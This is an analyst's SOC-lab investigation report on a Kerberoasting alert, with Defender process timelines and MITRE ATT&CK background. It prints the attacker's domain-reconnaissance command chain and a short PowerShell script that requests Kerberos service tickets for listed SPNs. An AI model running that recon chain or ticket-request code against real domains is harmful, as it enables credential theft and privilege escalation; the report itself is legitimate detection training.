# 🔍 Alert Investigation Report

> **Platform:** SOC Simulation Project — WDLabs  
> **Environment:** Microsoft Defender for Endpoint / Microsoft Sentinel

---

## 📋 Case Details

| Field                 | Value                                                                                                                                                              |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Alert Name**        | Potential Kerberoasting activity                                                                                                                                   |
| **Alert ID / Link**   | da1712631f-3404-43b0-8e5f-9e7ce03198d6_1 / https://security.microsoft.com/alerts/da1712631f-3404-43b0-8e5f-9e7ce03198d6_1?tid=567ea528-4e82-40fa-914e-38c05fd69677 |
| **Analyst**           | Carl                                                                                                                                                               |
| **Date Investigated** | 15/09/2026                                                                                                                                                         |
| **Severity**          | High                                                                                                                                                               |

---

## 1. Alert Summary

- **Host / Account affected:** System, Dave Brown, Administrator, socsim-srv01.socsim.local, dclist:socsim.local
- **Date & Time of alert:** 25 Aug 2026 22:58:11
- **What triggered the alert:** Suspicious password policy discovery activity
- **Why it triggered (rule/logic):** Suspicious behavior by svchost.exe was observed

---

## 2. Investigation Findings

### What happened?
<!-- How was the activity executed or triggered? Walk through the technical detail. -->

The alert was triggered when `svc.host.exe` launched `cmd.exe` with this command line:

```
"cmd.EXE" /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q / & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
```

The activity was flagged as suspicious because of `setspn.exe`. This tool reads, modifies and deletes the Service Principal Name (SPN) property on Active Directory service accounts. SPNs identify the service accounts that are running a service, which makes those accounts targets for Kerberoasting.

The commands ran on Windows Server hosts in the `socsim.local` domain, including **srv1-2** and **DC** (the domain controller). They were run under the **SYSTEM**, **Dave Brown** and **Administrator** accounts. The IP addresses involved were in the **172.x.x.x** range.

The output of these discovery commands was saved to `C:\Windows\Temp\svcdiag_survey.txt`. Writing reconnaissance output to a Temp directory is suspicious. The attacker likely used this file to collect information about domain controllers, privileged groups, service accounts and the domain password policy.

Next, the attacker appears to have stolen Kerberos service tickets using a hidden script, `svcupd.ps1`, which was run with `-ExecutionPolicy Bypass`. Our assessment is that the attacker used the SPN list to request service tickets from Active Directory. These tickets can be taken offline and cracked to recover the service account passwords.

We also saw a PowerShell execution that Windows Defender did not alert on:

```
powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command "& {if ($ExecutionContext.SessionState.LanguageMode -eq 'FullLanguage') {$OutputEncoding = [Console]::OutputEncoding = [System.Text.Encoding]::UTF8} else {chcp 65001}; & 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8839.16604910.0.16604910-4b4c32cf9e4fab087b95ca20bf2b98182024a400\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' }"
```

This activity matches the MITRE ATT&CK technique **Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003)**. In this technique, an attacker uses a valid ticket-granting ticket (TGT), or sniffs network traffic, to get ticket-granting service (TGS) tickets that can then be brute-forced offline ([T1110](https://attack.mitre.org/techniques/T1110)).


### Evidence
<!-- What artefacts, log entries, or indicators support your conclusion? -->


==**There's are my notes gathered before the investigation report started.**==

**Process Timeline Logs**

```
25/8/2026 20:48:06 
 [608] smss.exe
Process id 608
Execution details Elevated
Image file path smss.exe
25/8/2026 20:48:06 
 [688] wininit.exe
Process id 688
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\wininit.exe
Image file SHA1 b2e437ce9aa57041730ea44dea1881b4963b59b4
Image file creation time 12 Nov 2025 22:14:17
Image file last modification time 12 Nov 2025 22:14:17
PE metadata wininit.exe
User NT AUTHORITY\SYSTEM
25/8/2026 20:48:06 
 [832] services.exe
Process id 832
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\services.exe
Image file SHA1 7f9951ca2fad3ee75f3904a07871480a75f03ad6
Image file creation time 10 Apr 2025 15:43:23
Image file last modification time 10 Apr 2025 15:43:23
PE metadata services.exe
User NT AUTHORITY\SYSTEM
25/8/2026 20:48:08 
 [1820] svchost.exe -k netsvcs -p -s Schedule
Command line svchost.exe -k netsvcs -p -s Schedule
Process id 1820
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\svchost.exe
Image file SHA1 b2917e343016a77036329a2368a8ad242defeb0f
Image file creation time 10 Apr 2025 15:43:19
Image file last modification time 10 Apr 2025 15:43:19
PE metadata svchost.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:40:54 
 [4792] MicrosoftEdgeUpdate.exe /ua /installsource scheduler
Command line "MicrosoftEdgeUpdate.exe" /ua /installsource scheduler
Process id 4792
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
Image file SHA1 afdb3d59dddf3c5fc1e9d95644ef23dd48137fb1
Image file creation time 9 Oct 2020 09:46:56
Image file last modification time 25 Aug 2026 20:35:51
PE metadata MicrosoftEdgeUpdate.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:53:10 
 [4116] UsoClient.exe StartScan
Command line "usoclient.exe" StartScan
Process id 4116
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\UsoClient.exe
Image file SHA1 b3837bc524fb8d1c67025d7fa90c30c0a4a7657d
Image file creation time 13 Feb 2025 10:43:30
Image file last modification time 13 Feb 2025 10:43:30
PE metadata UsoClient.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:55:43 
 [2840] cmd.exe /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
Command line "cmd.EXE" /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
Process id 2840
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\cmd.exe
Image file SHA1 bc2820b5ee7b43c172005b66546f12316de8c081
Image file creation time 10 Jul 2025 06:13:00
Image file last modification time 10 Jul 2025 06:13:00
Mitre techniques T1558.003: Kerberoasting
PE metadata cmd.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline svcdiag_survey.txt
Suspicious password policy discovery activity
Suspicious behavior by svchost.exe was observed Resolved Detected Medium
25/8/2026 22:55:43 
 [4300] nltest.exe nltest  /dclist: 
Command line nltest  /dclist: 
Process id 4300
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\nltest.exe
Image file SHA1 165d69da6b0aabf82a92dec7e8651a5697ebda54
Image file creation time 14 Nov 2024 13:58:11
Image file last modification time 14 Nov 2024 13:58:11
PE metadata nltest.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:55:43 
 [5884] net.exe net  group "Domain Admins" /domain 
Command line net  group "Domain Admins" /domain 
Process id 5884
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:55:43 
 [5520] net.exe net  group "Domain Controllers" /domain 
Command line net  group "Domain Controllers" /domain 
Process id 5520
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:55:44 
 [3436] setspn.exe setspn  -Q */* 
Command line setspn  -Q */* 
Process id 3436
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\setspn.exe
Image file SHA1 a2da437b049a67474d61e7c0993b74aa09837e99
Image file creation time 8 May 2021 18:14:50
Image file last modification time 8 May 2021 18:14:50
Mitre techniques T1558.003: Kerberoasting
PE metadata setspn.exe
User NT AUTHORITY\SYSTEM
Potential Kerberoasting activity Resolved Detected High
25/8/2026 22:55:44 
 cmd.exe initiated kerberoasting using setspn.exe
Mitre techniques T1558.003: Kerberoasting
Executed tool setspn.exe
Potential Kerberoasting activity Resolved Detected High
25/8/2026 22:55:44 
 [3996] net.exe net  accounts /domain
Command line net  accounts /domain
Process id 3996
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
25/8/2026 23:02:08 
 [1740] dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)
Command line "dsregcmd.exe" $(Arg0) $(Arg1) $(Arg2)
Process id 1740
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\dsregcmd.exe
Image file SHA1 b7ce7c14599cc574fdbd620b8ce5f64a4db9f88a
Image file creation time 14 Nov 2024 13:55:59
Image file last modification time 14 Nov 2024 13:55:59
PE metadata dsregcmd.exe
User NT AUTHORITY\SYSTEM
25/8/2026 23:20:59 
 [4036] cmd.exe /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
Command line "cmd.EXE" /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
Process id 4036
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\cmd.exe
Image file SHA1 bc2820b5ee7b43c172005b66546f12316de8c081
Image file creation time 10 Jul 2025 06:13:00
Image file last modification time 10 Jul 2025 06:13:00
Mitre techniques T1558.003: Kerberoasting
PE metadata cmd.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline svcdiag_survey.txt
Suspicious password policy discovery activity
Suspicious behavior by svchost.exe was observed Resolved Detected Medium
25/8/2026 23:20:59 
 [3508] nltest.exe nltest  /dclist: 
Command line nltest  /dclist: 
Process id 3508
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\nltest.exe
Image file SHA1 165d69da6b0aabf82a92dec7e8651a5697ebda54
Image file creation time 14 Nov 2024 13:58:11
Image file last modification time 14 Nov 2024 13:58:11
PE metadata nltest.exe
User NT AUTHORITY\SYSTEM
25/8/2026 23:20:59 
 [4780] net.exe net  group "Domain Admins" /domain 
Command line net  group "Domain Admins" /domain 
Process id 4780
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
25/8/2026 23:20:59 
 [3896] net.exe net  group "Domain Controllers" /domain 
Command line net  group "Domain Controllers" /domain 
Process id 3896
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
25/8/2026 23:20:59 
 [5632] setspn.exe setspn  -Q */* 
Command line setspn  -Q */* 
Process id 5632
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\setspn.exe
Image file SHA1 a2da437b049a67474d61e7c0993b74aa09837e99
Image file creation time 8 May 2021 18:14:50
Image file last modification time 8 May 2021 18:14:50
Mitre techniques T1558.003: Kerberoasting
PE metadata setspn.exe
User NT AUTHORITY\SYSTEM
Potential Kerberoasting activity Resolved Detected High
25/8/2026 23:20:59 
 cmd.exe initiated kerberoasting using setspn.exe
Mitre techniques T1558.003: Kerberoasting
Executed tool setspn.exe
Potential Kerberoasting activity Resolved Detected High
25/8/2026 23:20:59 
 [5588] net.exe net  accounts /domain
Command line net  accounts /domain
Process id 5588
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
25/8/2026 23:21:32 
 [2284] powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\Windows\Temp\svccache\svcupd.ps1
Command line "powershell.EXE" -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\Windows\Temp\svccache\svcupd.ps1
Process id 2284
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Image file SHA1 3e72bef25a1cd88c502421e3d50a8eb4c6bd1226
Image file creation time 14 Nov 2024 14:00:53
Image file last modification time 14 Nov 2024 14:00:53
PE metadata powershell.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline svcupd.ps1
25/8/2026 23:21:32 
 powershell.exe executed a script
Content Add-Type -AssemblyName System.IdentityModel; $spns = @("MSSQLSvc/SOCSIM-DC.socsim.local:1433","HTTP/SOCSIM-SRV01.socsim.local:80","BackupSvc/SOCSIM-DC.socsim.local"); foreach ($s in $spns) { try { $null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s; Add-Content -Path "C:\Windows\Temp\svccache\tickets.txt" -Value ("TGS ok: " + $s) } catch { Add-Content -Path "C:\Windows\Temp\svccache\tickets.txt" -Value ("ERR: " + $s + " :: " + $_.Exception.Message) } }

Content SHA256 e0221a823bb0cfdd2fc659fd8a3da01f6f68d8ac7de2fdc4ee0a6d93ecf71325
25/8/2026 23:40:54 
 [3896] MicrosoftEdgeUpdate.exe /ua /installsource scheduler
Command line "MicrosoftEdgeUpdate.exe" /ua /installsource scheduler
Process id 3896
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
Image file SHA1 afdb3d59dddf3c5fc1e9d95644ef23dd48137fb1
Image file creation time 9 Oct 2020 09:46:56
Image file last modification time 25 Aug 2026 20:35:51
PE metadata MicrosoftEdgeUpdate.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:02:08 
 [3084] dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)
Command line "dsregcmd.exe" $(Arg0) $(Arg1) $(Arg2)
Process id 3084
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\dsregcmd.exe
Image file SHA1 b7ce7c14599cc574fdbd620b8ce5f64a4db9f88a
Image file creation time 14 Nov 2024 13:55:59
Image file last modification time 14 Nov 2024 13:55:59
PE metadata dsregcmd.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:27:32 
 [4788] taskhostw.exe
Process id 4788
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\taskhostw.exe
Image file SHA1 6ad8ce3f2b7a377c3ad27a45cf1659dbbecb470c
Image file creation time 10 Apr 2025 15:43:49
Image file last modification time 10 Apr 2025 15:43:49
PE metadata taskhostw.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:40:54 
 [5900] MicrosoftEdgeUpdate.exe /ua /installsource scheduler
Command line "MicrosoftEdgeUpdate.exe" /ua /installsource scheduler
Process id 5900
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
Image file SHA1 afdb3d59dddf3c5fc1e9d95644ef23dd48137fb1
Image file creation time 9 Oct 2020 09:46:56
Image file last modification time 25 Aug 2026 20:35:51
PE metadata MicrosoftEdgeUpdate.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:48:10 
 [5112] taskhostw.exe
Process id 5112
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\taskhostw.exe
Image file SHA1 6ad8ce3f2b7a377c3ad27a45cf1659dbbecb470c
Image file creation time 10 Apr 2025 15:43:49
Image file last modification time 10 Apr 2025 15:43:49
PE metadata taskhostw.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:48:10 
 [3012] rundll32.exe C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks
Command line "rundll32.exe" C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks
Process id 3012
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\rundll32.exe
Image file SHA1 5a4ebdf7c985c6a6aa7e86ab7061a57a00c8e900
Image file creation time 10 Apr 2025 15:43:25
Image file last modification time 10 Apr 2025 15:43:25
PE metadata rundll32.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline Windows.StateRepositoryClient.dll
26/8/2026 00:48:10 
 [5520] CompatTelRunner.exe -maintenance
Command line "compattelrunner.exe" -maintenance
Process id 5520
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\CompatTelRunner.exe
Image file SHA1 6de439f1048e9423fd95fb39906439557c7ba243
Image file creation time 10 Apr 2025 15:43:15
Image file last modification time 10 Apr 2025 15:43:15
PE metadata CompatTelRunner.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:48:10 
 [2828] dstokenclean.exe
Command line "dstokenclean.exe"
Process id 2828
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\dstokenclean.exe
Image file SHA1 2b70cee736558dc3e724b3347a2cb24edf94015e
Image file creation time 14 Nov 2024 13:55:57
Image file last modification time 14 Nov 2024 13:55:57
PE metadata dstokenclean.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:48:10 
 [4648] sc.exe start w32time task_started
Command line "sc.exe" start w32time task_started
Process id 4648
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\sc.exe
Image file SHA1 75881652f0f9384de229ab396bf27f1dda244bbc
Image file creation time 8 May 2021 18:14:42
Image file last modification time 8 May 2021 18:14:42
PE metadata sc.exe
User NT AUTHORITY\LOCAL SERVICE
26/8/2026 00:48:10 
 [6080] taskhostw.exe
Process id 6080
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\taskhostw.exe
Image file SHA1 6ad8ce3f2b7a377c3ad27a45cf1659dbbecb470c
Image file creation time 10 Apr 2025 15:43:49
Image file last modification time 10 Apr 2025 15:43:49
PE metadata taskhostw.exe
User NT AUTHORITY\LOCAL SERVICE
26/8/2026 00:48:10 
 [3616] DiskSnapshot.exe -z
Command line "disksnapshot.exe" -z
Process id 3616
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\DiskSnapshot.exe
Image file SHA1 d6c4009810db48d6a182f385a676de15a963e38a
Image file creation time 8 May 2021 18:14:18
Image file last modification time 8 May 2021 18:14:18
PE metadata DiskSnapshot.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:48:10 
 [3224] tzsync.exe
Command line "tzsync.exe"
Process id 3224
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\tzsync.exe
Image file SHA1 edcad90f35fe8e5c4ddf3536e9993805ff42753a
Image file creation time 8 May 2021 18:14:40
Image file last modification time 8 May 2021 18:14:40
PE metadata tzsync.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:48:12 
 [4164] taskhostw.exe /RuntimeWide
Command line taskhostw.exe /RuntimeWide
Process id 4164
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\taskhostw.exe
Image file SHA1 6ad8ce3f2b7a377c3ad27a45cf1659dbbecb470c
Image file creation time 10 Apr 2025 15:43:49
Image file last modification time 10 Apr 2025 15:43:49
PE metadata taskhostw.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:48:18 
 [3676] taskhostw.exe
Process id 3676
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\taskhostw.exe
Image file SHA1 6ad8ce3f2b7a377c3ad27a45cf1659dbbecb470c
Image file creation time 10 Apr 2025 15:43:49
Image file last modification time 10 Apr 2025 15:43:49
PE metadata taskhostw.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:52:19 
 [2224] cmd.exe /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
Command line "cmd.EXE" /c (nltest /dclist: & net group "Domain Admins" /domain & net group "Domain Controllers" /domain & setspn -Q */* & net accounts /domain) > C:\Windows\TEMP\svcdiag_survey.txt 2>&1
Process id 2224
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\cmd.exe
Image file SHA1 bc2820b5ee7b43c172005b66546f12316de8c081
Image file creation time 10 Jul 2025 06:13:00
Image file last modification time 10 Jul 2025 06:13:00
Mitre techniques T1558.003: Kerberoasting
PE metadata cmd.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline svcdiag_survey.txt
Suspicious password policy discovery activity
Suspicious behavior by svchost.exe was observed Resolved Detected Medium
26/8/2026 00:52:19 
 [1704] nltest.exe nltest  /dclist: 
Command line nltest  /dclist: 
Process id 1704
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\nltest.exe
Image file SHA1 165d69da6b0aabf82a92dec7e8651a5697ebda54
Image file creation time 14 Nov 2024 13:58:11
Image file last modification time 14 Nov 2024 13:58:11
PE metadata nltest.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:52:19 
 [3036] net.exe net  group "Domain Admins" /domain 
Command line net  group "Domain Admins" /domain 
Process id 3036
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:52:19 
 [5532] net.exe net  group "Domain Controllers" /domain 
Command line net  group "Domain Controllers" /domain 
Process id 5532
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:52:19 
 [5920] setspn.exe setspn  -Q */* 
Command line setspn  -Q */* 
Process id 5920
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\setspn.exe
Image file SHA1 a2da437b049a67474d61e7c0993b74aa09837e99
Image file creation time 8 May 2021 18:14:50
Image file last modification time 8 May 2021 18:14:50
Mitre techniques T1558.003: Kerberoasting
PE metadata setspn.exe
User NT AUTHORITY\SYSTEM
Potential Kerberoasting activity Resolved Detected High
26/8/2026 00:52:19 
 cmd.exe initiated kerberoasting using setspn.exe
Mitre techniques T1558.003: Kerberoasting
Executed tool setspn.exe
Potential Kerberoasting activity Resolved Detected High
26/8/2026 00:52:20 
 [4352] net.exe net  accounts /domain
Command line net  accounts /domain
Process id 4352
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\net.exe
Image file SHA1 0028299b1a55e128802d2d818eac3f9d46067e5d
Image file creation time 8 May 2021 18:14:41
Image file last modification time 8 May 2021 18:14:41
PE metadata net.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:53:17 
 [4680] powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\Windows\Temp\svccache\svcupd.ps1
Command line "powershell.EXE" -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\Windows\Temp\svccache\svcupd.ps1
Process id 4680
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Image file SHA1 3e72bef25a1cd88c502421e3d50a8eb4c6bd1226
Image file creation time 14 Nov 2024 14:00:53
Image file last modification time 14 Nov 2024 14:00:53
PE metadata powershell.exe
User NT AUTHORITY\SYSTEM
Referenced in commandline svcupd.ps1
26/8/2026 00:56:26 
 [976] UsoClient.exe StartScan
Command line "usoclient.exe" StartScan
Process id 976
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\UsoClient.exe
Image file SHA1 b3837bc524fb8d1c67025d7fa90c30c0a4a7657d
Image file creation time 13 Feb 2025 10:43:30
Image file last modification time 13 Feb 2025 10:43:30
PE metadata UsoClient.exe
User NT AUTHORITY\SYSTEM
26/8/2026 01:02:08 
 [4428] dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)
Command line "dsregcmd.exe" $(Arg0) $(Arg1) $(Arg2)
Process id 4428
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\dsregcmd.exe
Image file SHA1 b7ce7c14599cc574fdbd620b8ce5f64a4db9f88a
Image file creation time 14 Nov 2024 13:55:59
Image file last modification time 14 Nov 2024 13:55:59
PE metadata dsregcmd.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:41:16 
 'CalderaAgent' service was started by services.exe
Service name CalderaAgent
Service command line nssm.exe
Mitre techniques T1569.002: Service Execution
Name CalderaAgent
Command line nssm.exe
Created process nssm.exe
Suspicious service launched Resolved Detected Medium
```

**Alert Timeline**

```
 Potential Kerberoasting activity
Potential Kerberoasting activity Resolved Detected High
25/8/2026 22:55:44 
 [2840] cmd.exe created [3436] setspn.exe setspn  -Q */* 
Command line setspn  -Q */* 
Process id 3436
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\setspn.exe
Image file SHA1 a2da437b049a67474d61e7c0993b74aa09837e99
Image file creation time 8 May 2021 18:14:50
Image file last modification time 8 May 2021 18:14:50
Mitre techniques T1558.003: Kerberoasting
Initiating process cmd.exe
PE metadata setspn.exe
User NT AUTHORITY\SYSTEM
25/8/2026 22:55:44 
 cmd.exe initiated kerberoasting using setspn.exe
Mitre techniques T1558.003: Kerberoasting
Initiating process cmd.exe
Executed tool setspn.exe
25/8/2026 23:20:59 
 [4036] cmd.exe created [5632] setspn.exe setspn  -Q */* 
Command line setspn  -Q */* 
Process id 5632
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\setspn.exe
Image file SHA1 a2da437b049a67474d61e7c0993b74aa09837e99
Image file creation time 8 May 2021 18:14:50
Image file last modification time 8 May 2021 18:14:50
Mitre techniques T1558.003: Kerberoasting
Initiating process cmd.exe
PE metadata setspn.exe
User NT AUTHORITY\SYSTEM
25/8/2026 23:20:59 
 cmd.exe initiated kerberoasting using setspn.exe
Mitre techniques T1558.003: Kerberoasting
Initiating process cmd.exe
Executed tool setspn.exe
26/8/2026 00:52:19 
 [2224] cmd.exe created [5920] setspn.exe setspn  -Q */* 
Command line setspn  -Q */* 
Process id 5920
Execution details Token elevation: Default, Integrity level: System
Image file path C:\Windows\System32\setspn.exe
Image file SHA1 a2da437b049a67474d61e7c0993b74aa09837e99
Image file creation time 8 May 2021 18:14:50
Image file last modification time 8 May 2021 18:14:50
Mitre techniques T1558.003: Kerberoasting
Initiating process cmd.exe
PE metadata setspn.exe
User NT AUTHORITY\SYSTEM
26/8/2026 00:52:19 
 cmd.exe initiated kerberoasting using setspn.exe
Mitre techniques T1558.003: Kerberoasting
Initiating process cmd.exe
Executed tool setspn.exe
```

**MITRE ATT&CK info**
# Steal or Forge Kerberos Tickets: Kerberoasting

##### Other sub-techniques of Steal or Forge Kerberos Tickets (5)

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).[[1]](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)[[2]](https://adsecurity.org/?p=2293)

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service[[3]](https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/)).[[4]](https://msdn.microsoft.com/library/ms677949.aspx)[[5]](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx)[[6]](https://redsiege.com/kerberoast-slides)[[7]](https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/)

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).[[1]](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)[[2]](https://adsecurity.org/?p=2293) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.[[2]](https://adsecurity.org/?p=2293)[[1]](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) [[7]](https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/)

This same behavior could be executed using service tickets captured from network traffic.[[2]](https://adsecurity.org/?p=2293)

Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).[[6]](https://redsiege.com/kerberoast-slides)

**KQL log searching** 

Finding the device log history that found on the windows defender alert.
![[Pasted image 20260915120702.png|729]]


Powershell coimmands used

